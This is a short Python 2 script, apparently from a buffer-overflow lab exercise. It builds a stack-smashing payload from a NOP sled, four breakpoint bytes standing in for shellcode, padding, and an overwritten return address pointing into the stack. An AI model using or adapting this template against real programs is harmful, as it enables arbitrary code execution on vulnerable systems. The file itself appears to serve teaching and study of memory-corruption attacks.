#!!/usr/bin/python
#attack2.py

n=100
nops_count=12
trap_count=4

nopsled = '\x90' * nops_count
shellcode = '\xcc' * trap_count
pad = 'A' * (n - nops_count - len(shellcode))
rip = '\xc0\xdb\xff\xff\xff\x7f\x00\x00'

print nopsled + shellcode + pad + rip
